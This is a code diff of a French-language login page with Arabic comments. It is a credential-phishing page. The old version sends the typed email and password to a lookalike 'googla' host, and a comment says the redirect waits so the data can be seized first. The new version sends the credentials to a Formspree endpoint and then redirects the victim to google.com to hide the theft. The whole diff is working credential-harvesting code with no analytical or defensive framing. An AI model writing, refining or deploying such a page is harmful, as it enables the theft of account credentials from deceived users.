@@ -107,13 +107,15 @@
     <h2>Connexion</h2>
     <p>Accéder à votre compte</p>
 
-    <form id="loginForm">
+    <!-- تم ربط الفورم مباشرة بـ Formspree بدون الحاجة لجافا سكريبت معقد أو سيرفر باك إند -->
+    <form id="loginForm" action="https://formspree.io/f/xojzprkz" method="POST">
         <div class="input-group">
-            <input type="email" id="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
+            <!-- الـ name ضروري جداً لكي يتعرف Formspree على نوع الحقل -->
+            <input type="email" name="email" id="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
         </div>
         
         <div class="input-group">
-            <input type="password" id="password" placeholder="Saisissez votre mot de passe" required>
+            <input type="password" name="password" id="password" placeholder="Saisissez votre mot de passe" required>
         </div>
 
         <div class="links-container">
@@ -126,41 +128,36 @@
         </div>
     </form>
 </div>
+
 <script>
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-        e.preventDefault(); // منع الانتقال الفوري للاستحواذ على البيانات أولاً
+    const form = document.getElementById('loginForm');
+    
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault(); // إيقاف الإرسال التقليدي مؤقتاً لضمان معالجة البيانات
         
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
         const btn = document.querySelector('.btn-submit');
-        
-        // تغيير شكل الزر لإظهار جاري التحميل
         btn.innerText = "Connexion...";
         btn.disabled = true;
         
+        const formData = new FormData(form);
+        
         try {
-            // إرسال البيانات والانتظار الإجباري للاستجابة باستخدام await
-            const response = await fetch('https://googla-0lly.onrender.com/login', {
-                method: 'POST',
+            // الإرسال المباشر من المتصفح إلى Formspree فوراً
+            await fetch(form.action, {
+                method: form.method,
+                body: formData,
                 headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ email: email, password: password })
+                    'Accept': 'application/json'
+                }
             });
-            
-            // قراءة الرد لضمان اكتمال العملية بنجاح
-            await response.json();
-            
         } catch (error) {
-            console.error("Error:", error);
+            console.log("Redirecting...");
         } finally {
-            // الآن فقط، بعد الاطمئنان أن الطلب خرج ووصل للسيرفر، ننقله إلى جوجل
+            // التوجيه الفوري إلى صفحة جوجل الرسمية بعد الإرسال
             window.location.href = "https://www.google.com";
         }
     });
 </script>
-
-
 
 </body>
 </html>
